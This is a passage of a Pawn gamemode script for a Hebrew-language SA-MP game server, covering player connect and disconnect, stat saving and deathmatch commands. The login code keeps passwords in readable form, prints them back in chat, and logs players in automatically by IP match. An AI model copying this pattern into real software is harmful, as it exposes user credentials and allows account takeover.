"Infernus", "Voodoo", "Pony", "Mule", "Cheetah", "Ambulance", "Leviathan", "Moonbeam", "Esperanto", "Taxi", "Washington", "Bobcat",
"Whoopee", "BF Injection", "Hunter", "Premier", "Enforcer", "Securicar", "Banshee", "Predator", "Bus", "Rhino", "Barracks", "Hotknife",
"Trailer 1", "Previon", "Coach", "Cabbie", "Stallion", "Rumpo", "RC Bandit", "Romero", "Packer", "Monster", "Admiral", "Squalo",
"Seasparrow", "Pizzaboy", "Tram", "Trailer 2", "Turismo", "Speeder", "Reefer", "Tropic", "Flatbed", "Yankee", "Caddy", "Solair",
"Berkley's RC Van", "Skimmer", "PCJ-600", "Faggio", "Freeway", "RC Baron", "RC Raider", "Glendale", "Oceanic", "Sanchez", "Sparrow",
"Patriot", "Quad", "Coastguard", "Dinghy", "Hermes", "Sabre", "Rustler", "ZR-350", "Walton", "Regina", "Comet", "BMX", "Burrito",
"Camper", "Marquis", "Baggage", "Dozer", "Maverick", "News Chopper", "Rancher", "FBI Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring",
"Sandking", "Blista Compact", "Police Maverick", "Boxvillde", "Benson", "Mesa", "RC Goblin", "Hotring Racer A", "Hotring Racer B",
"Bloodring Banger", "Rancher", "Super GT", "Elegant", "Journey", "Bike", "Mountain Bike", "Beagle", "Cropduster","Stunt",  "Tanker",
"Roadtrain", "Nebula", "Majestic", "Buccaneer", "Shamal", "Hydra", "FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck", "Fortune",
"Cadrona", "FBI Truck", "Willard", "Forklift", "Tractor", "Combine", "Feltzer", "Remington", "Slamvan", "Blade", "Freight", "Streak",
"Vortex", "Vincent", "Bullet", "Clover", "Sadler", "Firetruck LA", "Hustler", "Intruder", "Primo", "Cargobob", "Tampa", "Sunrise", "Merit",
"Utility", "Nevada", "Yosemite", "Windsor", "Monster A", "Monster B", "Uranus", "Jester", "Sultan", "Stratum", "Elegy", "Raindance",
"RC Tiger", "Flash", "Tahoma", "Savanna", "Bandito", "Freight Flat", "Streak Carriage", "Kart", "Mower", "Dune", "Sweeper", "Broadway",
"Tornado", "AT-400", "DFT-30", "Huntley", "Stafford", "BF-400", "News Van", "Tug", "Trailer 3", "Emperor", "Wayfarer", "Euros", "Hotdog",
"Club", "Freight Carriage", "Trailer 4", "Andromada", "Dodo", "RC Cam", "Launch", "Police Car (LSPD)", "Police Car (SFPD)",
"Police Car (LVPD)", "Police Ranger", "Picador", "S.W.A.T", "Alpha", "Phoenix", "Glendale", "Sadler", "Luggage Trailer A",
"Luggage Trailer B", "Stairs", "Boxville", "Tiller", "Utility Trailer"
};

new bool:TextDrawsShown[MAX_PLAYERS];
new bool:LightRedHealthCreated[MAX_PLAYERS];
new bool:LightYellowSpeedCreated[MAX_PLAYERS];
new bool:VHSCreated[MAX_PLAYERS];
new bool:ExclamationShown[MAX_PLAYERS];
new CheckStatusTimer;
new Text:Black0;
new Text:Black1;
new Text:Black2;
new Text:Black3;
new Text:LightBlack;
new Text:BlackHealth;
new Text:DarkRedHealth;
new Text:BlackSpeed;
new Text:DarkYellowSpeed;
new Text:Marker;
new Text:Exclamation;
new Text:VHS[MAX_PLAYERS];
new Text:LightRedHealth[MAX_PLAYERS];
new Text:LightYellowSpeed[MAX_PLAYERS];
new Float:OldX[MAX_PLAYERS];
new Float:OldY[MAX_PLAYERS];
new Float:OldZ[MAX_PLAYERS];
//=[spawntoworld]=====================================
new hdmworld[20];
//=====================================NejetpackStart=====================================
#define MinjetpackPlayers 1
new jetpackOn;
new Injetpack[MAX_PLAYERS];
new jetpackPlayers;
new jetpackadminsname[MAX_PLAYER_NAME];
new Countjetpackllenge;
new jetpackKnoob;
new CountjetpackllengeFuc;
new kboobjetpack[256];
new jetpackWinner;
new jetpackTIME;
new jetpackSECX;
new jet_pack_area;
new jetpackStart;
new Pjetpackin[MAX_PLAYERS];
//=============================Random jetpack Spawns================================


new Float:jetpackSpawn[][3] = {

	{ -961.5479,1848.5031,12.2031 },
	{ -940.0098,1858.7971,5.00515 },
	{ -938.0781,1876.2843,5.0000},
	{ -957.2078,1886.8132,5.0000},
	{ -938.2423,1903.3096,5.0000},
	{ -956.5942,1911.2458,5.0000},
	{ -938.1145,1924.1494,5.0000},
	{ -957.4159,1931.6732,5.0000},
	{ -938.1269,1945.9856,5.0000},
	{ -957.7599,1953.0101,5.0000},
	{ -951.0218,1942.4587,11.5554},
	{ -952.9576,1899.8105,14.4985},
	{ -953.8908,1857.6903,11.8708},
	{ -962.1760,1881.3625,12.2014},
	{ -961.8605,1903.3387,12.2014},
	{ -961.5814,1925.3914,12.2031},
	{ -961.8989,1941.6671,12.2014},
	{ -961.4434,1952.1378,12.2014},
	{ -962.1296,1890.4679,9.0061},
	{ -961.9213,1933.0769,9.0000},
	{ -938.9757,1953.1177,21.0000},
	{ -939.3128,1937.6218,21.0000},
	{ -939.1136,1918.7047,21.0000},
	{ -939.0709,1897.0571,21.0000},
	{ -939.2014,1879.7917,21.0000},
	{ -939.3738,1867.6953,21.0000},
	{ -939.1301,1857.5570,21.0000},
	{ -960.8723,1860.9022,21.0000},
	{ -960.9331,1904.3599,21.0000},
	{ -961.2296,1944.7965,21.0000}
 };
new gang_jp;
new camrea[200];
new InCounterStrike[200],tempcs[2],Allow_Armour[200],Allow_Health[200],AmmunationS1,AmmunationS2,AmmunationS3;
new money1k;new money1d;new money2d;new minihealth;new tambal;new forumadress;new disarmw; new m4; new saWn;  new dynamite[200]; new Float:XBomb,Float:YBomb,Float:ZBomb; new info1; new info2;
new bombshop,bombusing[200];
//=[Connected]==========================================
public OnPlayerConnect(playerid)
{

new rand_cam = random(11);
camrea[playerid] = rand_cam;
new str[256];
Allow_Health[playerid] = 1;
Allow_Armour[playerid] = 1;

format(str,sizeof(str),"*** %s has joined the server.",GetName(playerid));
for(new i = 0; i < MAX_PLAYERS; i++)
if(IsPlayerConnected(i) && i != playerid)
SendClientMessage(i,COLOR_GREY,str);
ResetTheVar(playerid);
SetTimerEx("AfterPlayerConnect", 1000, 0, "i", playerid);
bombusing[playerid] = 0;
online_players_update();
InAllMapRaceing[playerid] = 0;
hitman[playerid] = 0;
aDoingSoon[playerid] = 0;
InTheServer ++;
PlayerProps[playerid] = 0;
EarningsForPlayer[playerid] = 0;
InCounterStrike[playerid] = 0;
SetPlayerColor(playerid,sgba2hex(random(256),random(256),random(256),77));//צבע במפה


if(!dini_Exists(GetPlayerFile(playerid)))
{

format(str, sizeof(str), "!%s - ברוך הבא ל", GetName(playerid));
SendClientMessage(playerid, COLOR_LIGHTGREEN, str);
SendClientMessage(playerid, COLOR_YELLOW, "/help :לעזרה יש להקיש את הפקודה");
SendClientMessage(playerid, COLOR_YELLOW, "Forum: Satla-Zone.co.il");
SendClientMessage(playerid, COLOR_LIGHTGREEN, "/register :הכינוי שלך לא רשום, להרשמה");

}
else
{
if(dini_Int(GetPlayerFile(playerid),"autologins") == 0 && !strcmp(GetIP(playerid),dini_Get(GetPlayerFile(playerid),"LastConnectIP"),true))
{
format(str, sizeof(str), "!%s - ברוך הבא ל", GetName(playerid));
SendClientMessage(playerid, COLOR_LIGHTGREEN, str);
SendClientMessage(playerid, COLOR_YELLOW, "/help :לעזרה יש להקיש את הפקודה");
SendClientMessage(playerid, COLOR_YELLOW, "Forum: Satla-Zone.co.il");
SendClientMessage(playerid, COLOR_LIGHTGREEN, ".התחברת אוטומטית לפי זיהוי כתובת האייפי שלך");

LoginPlayer(playerid);
PlayerInfo[playerid][TimeOnServer] +=1;
PlayerInfo[playerid][Logged] = 1;
}
else
{
format(str, sizeof(str), "!%s - ברוך הבא ל", GetName(playerid));
SendClientMessage(playerid, COLOR_LIGHTGREEN, str);
SendClientMessage(playerid, COLOR_YELLOW, "/help :לעזרה יש להקיש את הפקודה");
SendClientMessage(playerid, COLOR_YELLOW, "Forum: Satla-Zone.co.il");
SendClientMessage(playerid, COLOR_LIGHTGREEN, "/login :הכינוי שלך רשום, על מנת להתחבר");
}


for(new propid; propid < Propertiesamount; propid++){
if(PropInfo[propid][PropIsBought] == 1){
if(strcmp(PropInfo[propid][PropOwner], GetName(playerid), true)==0){
EarningsForPlayer[playerid] += PropInfo[propid][PropEarning]; PlayerProps[playerid]++;
}}}
//=[

}
return 1;
}

new Exkill[200];
public AfterPlayerConnect(playerid)
{
TextDrawsShown[playerid] = false;
VHSCreated[playerid] = false;
LightRedHealthCreated[playerid] = false;
LightYellowSpeedCreated[playerid] = false;
TextDrawShowForPlayer(playerid,Box1);
TextDrawShowForPlayer(playerid,Box2);
TextDrawShowForPlayer(playerid,Textdraw1);
ClanMute[playerid] = 0;
IsInvited[playerid] = 0;
Spectatorl[playerid]=0;
FakeKill[playerid] = 0;
SetPlayerVars(playerid);
//=[ESC]================================================
//gState[playerid] = e_STATE_CONNECTED;
//=[FixLacy]====================================================
EnableStuntBonusForPlayer(playerid,0);
//=[CallSystem`s]================================================
CellState[playerid]=LIBRE;
AuxiliarTel[playerid]=-1;
CellTime[playerid]=0;
TimerLLamando[playerid]=DEAD_TIMER_ID;
TimerCaidaFicha[playerid]=DEAD_TIMER_ID;
Numero_Tel[playerid]=random(8998)+1000;
borrarMemorias(playerid);
BankShipOn[playerid] = 0;
AirBreakVar[playerid] = 0;
SetDistance[playerid] = 5;
Exkill[playerid] = SetTimerEx("FakeKills",9*1000,0,"i",playerid);

return 1;
}




forward Player();
forward cp(); forward unfreeze(playerid);
forward TimeUpdate();
forward Descongelar(playerid);
forward AutoMessage(playerid);
forward SendPlayerFormattedText(playerid, const str[], define);
forward SendAllFormattedText(playerid, const str[], define);
forward PlayerLeaveGang(playerid);
forward isPlayerInArea();
forward PayPlayerInArea();
forward PirateShipScoreUpdate();
forward MoneyGrubScoreUpdate();
forward Givecashdelaytimer(playerid);
forward GrubModeReset();
forward GameModeExitFunc();


//=====================================News=====================================
new WarOnr,InWarr[MAX_PLAYERS],WarPlayersr,Countr,knoobr,CountFucr;
#define MinWarPlayersr 1
new Rewardr;
new WarWinnerr;
new CheckTimer;
new WSr;
new PPr[MAX_PLAYERS];
new WarWeaponsr[] = {35};



public OnPlayerDisconnect(playerid, reason)
{

new Reason[256];
switch(reason)
{
case 0: Reason = "Timed Out";
case 1: Reason = "Leaving";
case 2: Reason = "Kicked/Banned";
}

new string[256];
format(string,256,"*** %s has left the server. (%s)",GetName(playerid),Reason);
SendClientMessageToAllEx(playerid,COLOR_GREY,string);

count_online --;
format(string,sizeof(string),"%d",count_online);
SetServerRule("online players",string);



if(PChain[playerid] == 1)
{
ChaPlayers --; InCha[playerid] = 0; PChain[playerid] = 0;
}

if(RaceJumpKill == playerid)
{
EndJumpKill();
TogglePlayerControllable(RaceJumpKill, 1);
}

if(InDM[playerid] > 0)
{
OnPlayerCommandText(playerid,"/qdmz");
ResetPlayerWeapons(playerid);
SetPlayerHealth(playerid,0.0);
SetTimerEx("QDMZ",4*1000,0,"i",playerid);

}

if(Injetpack[playerid] == 1)
{
jetpackPlayers --; Injetpack[playerid] = 0; Pjetpackin[playerid] = 0;
GangZoneHideForPlayer(playerid,gang_jp);

}

if(Youregisterrace[playerid] ==1)
{
SetPlayerHealth(playerid,0.0);
Youregisterrace[playerid] =0;
RacePlayers--;
DisablePlayerRaceCheckpoint(playerid);
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);

}
if(YouRegister[playerid] ==1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SetPlayerHealth(playerid,0.0);
YouRegister[playerid] =0;
DisablePlayerRaceCheckpoint(playerid);
DriftPlayer--;

}
if(Registertrs[playerid] ==1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
CPTriatlon[playerid]=0;
DisablePlayerRaceCheckpoint(playerid);
Registertrs[playerid] =0;
CPTriatlon[playerid]=0;
RunPlayers--;
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);

}
//END
if(KK[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");

SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
KartPlayers --;
InKart[playerid] = 0;
KK[playerid] = 0;
Fuck[playerid] = 0;
DestroyVehicle(caridxx[playerid]);


}

if(MonsterNoTeleportion[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
iNmOnster[playerid] = 0;
MonsterPlayers --;
iNmOnster[playerid] = 0;
MonsterNoTeleportion[playerid] = 0;
MonsterFucker[playerid] = 0;
DestroyVehicle(MonsterSYSTEM[playerid]);
MonStart[playerid] =0;

}

if(PGrein[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
GrePlayers --; InGre[playerid] = 0; PGrein[playerid] = 0;
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");

}

if(PPw[playerid] == 1)
{
SendClientMessage(playerid,red,".הפסדת בפעילות שהייתה בה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
WarPlayersw --; InWarw[playerid] = 0; PPw[playerid] = 0;
SetPlayerVirtualWorld(playerid,0);

}
if(PP[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");
WarPlayers --;
InWar[playerid] = 0;
PP[playerid] = 0;

}
if(PPr[playerid] == 1)
{
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
ResetPlayerWeapons(playerid);
WarPlayersr --; InWarr[playerid] = 0; PPr[playerid] = 0;
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");

}
if(InBike[playerid] > 0)
{
SendClientMessage(playerid,red,".עזבת את הפעילות שבה הייתה");
SetPlayerHealth(playerid,0.0);
SetPlayerVirtualWorld(playerid,0);
ResetPlayerWeapons(playerid);
BikePlayers --;
InBike[playerid] =0;
new vehicleidss = GetPlayerVehicleID(playerid);
SetVehicleVirtualWorld(vehicleidss,0);
}

for(new timer = 0; timer < 14; timer++)
{
KillTimer(timers_rule[playerid][timer]);
}

if(PlayerInfo[playerid][Pets] ==1)
{
if(PlayerInfo[playerid][Shark] ==1)
{


DestroyStreamObject(sam33[playerid]);
SharkYou[playerid] =0;
ThePetsInYou[playerid] =0;
}
if(PlayerInfo[playerid][Dolp] ==1)
{
DestroyStreamObject(sam22[playerid]);
ThePetsInYou[playerid] =0;
DolpYou[playerid] =0;
}
if(PlayerInfo[playerid][Tor] ==1)
{
DestroyStreamObject(sam44[playerid]);
ThePetsInYou[playerid] =0;
TorYou[playerid] =0;
}
}
//=[SavePinfo]============================================================
if(dini_Exists(GetPlayerFile(playerid)) && IsPlayerLogged(playerid))
{
PlayerInfo[playerid][Logged] = 0;

dini_IntSet(GetPlayerFile(playerid),"Ans",PlayerInfo[playerid][Ans]);
dini_IntSet(GetPlayerFile(playerid),"BSHIP",PlayerInfo[playerid][BSHIP]);
dini_IntSet(GetPlayerFile(playerid),"Tor",PlayerInfo[playerid][Tor]);
dini_IntSet(GetPlayerFile(playerid),"Dolphin",PlayerInfo[playerid][Dolp]);
dini_IntSet(GetPlayerFile(playerid),"Pets",PlayerInfo[playerid][Pets]);
dini_IntSet(GetPlayerFile(playerid),"Shark",PlayerInfo[playerid][Shark]);
dini_IntSet(GetPlayerFile(playerid),"SharkKills",PlayerInfo[playerid][SharkKills]);
dini_IntSet(GetPlayerFile(playerid),"TorKills",PlayerInfo[playerid][TorKills]);
dini_IntSet(GetPlayerFile(playerid),"DolphinKills",PlayerInfo[playerid][DolphinKills]);
dini_IntSet(GetPlayerFile(playerid),"ProfileLogeed",PlayerInfo[playerid][ProfileLogged]);
dini_IntSet(GetPlayerFile(playerid),"Logged",PlayerInfo[playerid][Logged]);
dini_IntSet(GetPlayerFile(playerid),"Kills",PlayerInfo[playerid][Kills]);
dini_IntSet(GetPlayerFile(playerid),"Deaths",PlayerInfo[playerid][Deaths]);
dini_IntSet(GetPlayerFile(playerid),"Level",PlayerInfo[playerid][Level]);
dini_IntSet(GetPlayerFile(playerid),"GemelLogin",PlayerInfo[playerid][GemelLogin]);
dini_IntSet(GetPlayerFile(playerid),"KopatGemel",PlayerInfo[playerid][KopatGemel]);
dini_IntSet(GetPlayerFile(playerid),"AggInfo",PlayerInfo[playerid][AggInfo]);
dini_IntSet(GetPlayerFile(playerid),"aLevelnl",PlayerInfo[playerid][aLevelnl]);
dini_IntSet(GetPlayerFile(playerid),"aKillsnl",PlayerInfo[playerid][aKillsnl]);
dini_IntSet(GetPlayerFile(playerid),"Adminl",PlayerInfo[playerid][AdminsLevel]);
dini_IntSet(GetPlayerFile(playerid),"Wars",PlayerInfo[playerid][Wars]);
dini_IntSet(GetPlayerFile(playerid),"Karts",PlayerInfo[playerid][Kart]);
dini_IntSet(GetPlayerFile(playerid),"MonsterWin",PlayerInfo[playerid][Monster]);
dini_IntSet(GetPlayerFile(playerid),"RPGWIN",PlayerInfo[playerid][RPGS]);
dini_IntSet(GetPlayerFile(playerid),"MiniWin",PlayerInfo[playerid][MINIGUN]);
dini_IntSet(GetPlayerFile(playerid),"mlg",PlayerInfo[playerid][Mlg]);
dini_IntSet(GetPlayerFile(playerid),"Warning",PlayerInfo[playerid][Warnings]);
dini_IntSet(GetPlayerFile(playerid),"pWeeds",PlayerInfo[playerid][Weeds]);
dini_IntSet(GetPlayerFile(playerid),"TimeOnServer",PlayerInfo[playerid][TimeOnServer]);
dini_IntSet(GetPlayerFile(playerid),"Money",GetPlayerMoney(playerid));
dini_IntSet(GetPlayerFile(playerid),"autologins",PlayerInfo[playerid][autologin]);
dini_IntSet(GetPlayerFile(playerid),"GetAloan",PlayerInfo[playerid][GetAloan]);
dini_IntSet(GetPlayerFile(playerid),"MoneyLoan",PlayerInfo[playerid][MoneyLoan]);
dini_IntSet(GetPlayerFile(playerid),"armour",PlayerInfo[playerid][armourT]);
dini_IntSet(GetPlayerFile(playerid),"VIP",PlayerInfo[playerid][VIPS]);
dini_IntSet(GetPlayerFile(playerid),"CC",PlayerInfo[playerid][CcMode]);
dini_IntSet(GetPlayerFile(playerid),"SaveStrika",PlayerInfo[playerid][AirStrikeSaved]);
dini_FloatSet(GetPlayerFile(playerid),"xAir",PlayerInfo[playerid][xAirStrike]);
dini_FloatSet(GetPlayerFile(playerid),"yAir",PlayerInfo[playerid][yAirStrike]);
dini_FloatSet(GetPlayerFile(playerid),"zAir",PlayerInfo[playerid][zAirStrike]);
dini_IntSet(GetPlayerFile(playerid),"ofidcarid",pia[playerid][CarID] );
dini_IntSet(GetPlayerFile(playerid),"OFCARAR",pia[playerid][OwnCar] );
dini_IntSet(GetPlayerFile(playerid),"ofidcarid",pia[playerid][CarID] );
dini_IntSet(GetPlayerFile(playerid),"OFCARAR",pia[playerid][OwnCar] );
dini_Set(GetPlayerFile(playerid),"State","Offine");
//=[Delete]=====================================================
PlayerInfo[playerid][Warnings]=0;
PlayerInfo[playerid][Ans]= 0;
PlayerInfo[playerid][VIPS] = 0;
PlayerInfo[playerid][armourT] = 0;
PlayerInfo[playerid][ProfileLogged] =0;
PlayerInfo[playerid][Warnings] = 0;
PlayerInfo[playerid][Weeds] = 0;
PlayerInfo[playerid][TimeOnServer]=0;
PlayerInfo[playerid][Logged] = 0;
PlayerInfo[playerid][Level] = 0;
PlayerInfo[playerid][Kills] = 0;
PlayerInfo[playerid][Deaths] = 0;
PlayerInfo[playerid][Bank] = 0;
PlayerInfo[playerid][Wars] = 0;
PlayerInfo[playerid][autologin] = 0;
PlayerInfo[playerid][GetAloan] =0;
PlayerInfo[playerid][MoneyLoan] =0;
PlayerInfo[playerid][AdminsLevel] = 0;
PlayerInfo[playerid][Kart] = 0;
PlayerInfo[playerid][AggInfo] =0;
PlayerInfo[playerid][GemelLogin] = 0;
PlayerInfo[playerid][KopatGemel] =0;
PlayerInfo[playerid][Monster] = 0;
PlayerInfo[playerid][RPGS] = 0;
PlayerInfo[playerid][MINIGUN] = 0;
PlayerInfo[playerid][Mlg] = 0;
PlayerInfo[playerid][CcMode] = 0;
PlayerInfo[playerid][Supportives] =0;
PlayerInfo[playerid][Tor] =0;
PlayerInfo[playerid][Pets] =0;
PlayerInfo[playerid][Shark] =0;
PlayerInfo[playerid][Dolp] =0;
PlayerInfo[playerid][SharkKills] =0;
PlayerInfo[playerid][DolphinKills]=0;
PlayerInfo[playerid][TorKills] =0;
PlayerInfo[playerid][bazooka] =0;
PlayerInfo[playerid][aLevelnl]=0;
PlayerInfo[playerid][aKillsnl]=0;
PlayerInfo[playerid][Sawn] = 0;
PlayerInfo[playerid][MicroSMG] = 0;
PlayerInfo[playerid][Tec9] = 0;
PlayerInfo[playerid][M4] = 0;
PlayerInfo[playerid][MP5] = 0;
PlayerInfo[playerid][AK47] = 0;
PlayerInfo[playerid][Knife] = 0;
PlayerInfo[playerid][Katana] = 0;
PlayerInfo[playerid][CombatShotGun] = 0;
PlayerInfo[playerid][ShotGun] = 0;
PlayerInfo[playerid][SniperRifle] = 0;
PlayerInfo[playerid][CRifle] = 0;
PlayerInfo[playerid][Colt] = 0;
PlayerInfo[playerid][Sawn] = 0;
ThePetsInYou[playerid] =0;
DolpYou[playerid] =0;
SharkYou[playerid] =0;
TorYou[playerid] =0;
//=[Cartem`s]========================================================
pia[playerid][CarID] = 0;
pia[playerid][OwnCar] = 0;
//=[FL]==================================================================
PlayerInfo[playerid][FL] =0;
//NoMoreObject[playerid] =0;
FakeKill[playerid] = 0;
//=[ESC]==========================================================
//gState[playerid] = e_STATE_NONE;
//=[UnZibori]======================================================

//=[UnIgnoreDisconecet]=========================================
Ignore[playerid][playerid] =0;
//=[Weed`s]=======================================================
Stoned[playerid] =0;
//=[Pet`sDelete]===================================================
//==
InDM[playerid] = 0;
InBike[playerid] = 0;
PrivateCP[playerid] = 0;
driftwinner[playerid]=0;
DriftInvite[playerid] =0;
indrift[playerid] =0;
IfInvite[playerid] =0;
Explodeion[playerid] = 0;
AirStrikeInWar[playerid] =0;
//NoMoreObject[playerid] =0;
//KS:
PlayerKills[playerid] =0;
MoneyKillOnPlayer[playerid] =0;
//resert
aDoing[playerid] =0;
//=[Failed]============================================
Flayeri[playerid] =4;
//=[FixAC]=============================================
SetPlayerVars(playerid);
//=[INWARFIX]=============================================
mini[playerid] =0;
//=[FixCall]===============================================
InCall[playerid]=0;
//=[ShowTextDraw]===================================

//=[FixAge]=======================================
Sagebir[playerid]=0;
//=[Racepc]================================================
RaceCP[playerid] =0;
//=[Ignore/Cancelpm]================================================
cancelpm[playerid]=0;
Ignore[playerid][playerid] =0;
//=[Gang`s]================================================
playerGang[playerid]=0;
gangInvite[playerid]=0;
//=[ShamalMode`s]==========================================
//InShamal[playerid] = 0;
//=[AntiSpamre`s]==========================================
antispam[playerid] =0;
spamkick[playerid] =0;
antianti[playerid] =0;
//=[AntiAFK]=================================================
isafk[playerid] = 0;
//=[Pets]====================================================
DolpYou[playerid] =0;
SharkYou[playerid] =0;
TorYou[playerid] =0;
PetInWar[playerid] =0;
ThePetsInYou[playerid] =0;
//=[`HELP SERVER / Helpme]====================================================
helpme[playerid] =0;
//=[Weed`s]====================================================
TheWeed[playerid] =0;
//=[Other]======================================================
ClickedBm[playerid] = 0;
mini[playerid] = 0;
bank[playerid]=0;
//=[Cartem]===================================================
pia[playerid][CarID] = 0;
pia[playerid][OwnCar] = 0;
//=[Reason]==========================================================
}
//=[DiscPhone]=================================================================
OnPlayerCommandText(playerid,"/Hangup");
KillTimer(Exkill[playerid]);
//=[OutSystem`s]================================================================

//=[LeaveGange`s]====================================================
PlayerLeaveGang(playerid);


//new tmponserver[200];

switch(reason)
{
case 0: InTheServer --;
/*format(tmponserver, sizeof(tmponserver), "%d" ,InTheServer);
SetServerRule("online players",tmponserver);*/

}


InTheServer --;
/*
format(tmponserver, sizeof(tmponserver), "%d" ,InTheServer);
SetServerRule("online players",tmponserver);
*/
RemovePlayerFromRaces(playerid);
RemovePlayerFromRaces2(playerid);
OutDrift(playerid);
return 1;
}







//=[`Com`/Commands]===========================================================
public OnPlayerCommandText(playerid, cmdtext[])
{
new tmp[256];
new string[256],cmd[256];
new tmp2[256];
new playermoney;
new sendername[MAX_PLAYER_NAME];
new giveplayer[MAX_PLAYER_NAME];
new giveplayerid, moneys, idx;
cmd = strtok(cmdtext, idx);
if(20 < strlen(cmd)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
if(20 < strlen(tmp)) return SendClientMessage(playerid,red,".בלתי אפשרי להפיל את השרת שלנו");
//==/R/L==
new PlayerName[100];


if(strcmp(cmd, "/yes", true) == 0)
{
if(PlayerInfo[playerid][Logged] != 4) return 1;

format(string, sizeof(string),"~~~ (User: %s) !חשבון נוצר בהצלחה ~~~",GetName(playerid));
SendClientMessage(playerid,lblue,string);
format(string, sizeof(string),"Name: [%s]",GetName(playerid));
SendClientMessage(playerid,COLOR_ORANGE,string);
format(string, sizeof(string),"Password: [%s]",dini_Get(GetPlayerFile(playerid),"Password"));
SendClientMessage(playerid,COLOR_ORANGE,string);
format(string, sizeof(string),"IP %s",dini_Get(GetPlayerFile(playerid),"LastConnectIP"));
SendClientMessage(playerid,COLOR_ORANGE,string);
SendClientMessage(playerid,COLOR_ORANGE,"/editprofile :לעריכת הפרופיל");
SendClientMessage(playerid,COLOR_ORANGE,".התחברות: לפי זיהוי כתובת האיפי שלך");
PlayerInfo[playerid][autologin] = 0;
PlayerInfo[playerid][Logged] = 1;
return 1;
}
if(strcmp(cmd, "/no", true) == 0)
{
if(PlayerInfo[playerid][Logged] != 4) return 1;
format(string, sizeof(string),"~~~ (User: %s) !חשבון נוצר בהצלחה ~~~",GetName(playerid));
SendClientMessage(playerid,lblue,string);
format(string, sizeof(string),"Name: [%s]",GetName(playerid));
SendClientMessage(playerid,COLOR_ORANGE,string);
format(string, sizeof(string),"Password: [%s]",dini_Get(GetPlayerFile(playerid),"Password"));
SendClientMessage(playerid,COLOR_ORANGE,string);
format(string, sizeof(string),"IP %s",dini_Get(GetPlayerFile(playerid),"LastConnectIP"));
SendClientMessage(playerid,COLOR_ORANGE,string);
SendClientMessage(playerid,COLOR_ORANGE,"/editprofile :לעריכת הפרופיל");
SendClientMessage(playerid,COLOR_ORANGE,"'/Login' - התחברות: לפי הפקודה");

PlayerInfo[playerid][autologin] =1;
PlayerInfo[playerid][Logged] = 1;
return 1;
}


if(PlayerInfo[playerid][Logged] > 1) return SendClientMessage(playerid,red,".אנא המתן לסיום הרשמתך ולהקראת החוקים לאישורם, ולשאלת ההתחברות");



if (strcmp(cmdtext, "/hdm", true)==0)
{
if(InDM[playerid] > 0) return SendClientMessage(playerid,red,"/qdmz - אתה נמצא באיזור די-אם על מנת לבצע פקודות שנית");
if(isafk[playerid] == 1) return SendClientMessage(playerid,red,"/UNAFK על מנת לצאת מהמצב בצע/י .AFK Time אתה כבר במצע ");
new Randm = random(sizeof(DM_Hydra));
CreateTeleport(playerid,0,DM_Hydra[Randm][0], DM_Hydra[Randm][1], DM_Hydra[Randm][2],87.6602,0);
InDM[playerid] = 3;
ResetPlayerWeapons(playerid);
SetPlayerVirtualWorld(playerid,4);
SetPlayerInterior(playerid,0);


GivePlayerWeapon(playerid, 38, 800);
GivePlayerWeapon(playerid, 31, 400);
return 1;
}



if (strcmp(cmdtext, "/adm", true)==0)
{
if(PlayerInfo[playerid][Level] < 5) return Messagelevel(playerid,5);
if(InDM[playerid] > 0)  return SendClientMessage(playerid,red,"/qdmz - אתה נמצא באיזור די-אם על מנת לבצע פקודות שנית");
if(isafk[playerid] == 1) return SendClientMessage(playerid,red,"/UNAFK על מנת לצאת מהמצב בצע/י .AFK Time אתה כבר במצע ");
new Randm = random(sizeof(ADM));

CreateTeleport(playerid,0,ADM[Randm][0], ADM[Randm][1], ADM[Randm][2],ADM[Randm][3],0);
InDM[playerid] = 4;
ResetPlayerWeapons(playerid);
SetPlayerVirtualWorld(playerid,10);
SetPlayerInterior(playerid,0);
GivePlayerWeapon(playerid,25,1000);
GivePlayerWeapon(playerid,24,99999);
GivePlayerWeapon(playerid,27,99999);
return 1;
}


if (strcmp(cmdtext, "/dm", true)==0)
{
if(InDM[playerid] >0) return SendClientMessage(playerid,red,"/qdmz - אתה נמצא באיזור די-אם על מנת לבצע פקודות שנית");
if(isafk[playerid] == 1) return SendClientMessage(playerid,red,"/UNAFK על מנת לצאת מהמצב בצע/י .AFK Time אתה כבר במצע ");
new Randm = random(sizeof(DMPostion));
CreateTeleport(playerid,0,DMPostion[Randm][0], DMPostion[Randm][1], DMPostion[Randm][2],87.6602,0);
InDM[playerid] = 1;
ResetPlayerWeapons(playerid);
SetPlayerVirtualWorld(playerid,2);
SetPlayerInterior(playerid,0);
if(WeaponDM[playerid] == 38)
{
WeaponDM[playerid] = 35;
}
else
{
WeaponDM[playerid] = 38;
}
GivePlayerWeapon(playerid,WeaponDM[playerid],99999);

return 1;
}

if (strcmp(cmdtext, "/wdm", true)==0)
{

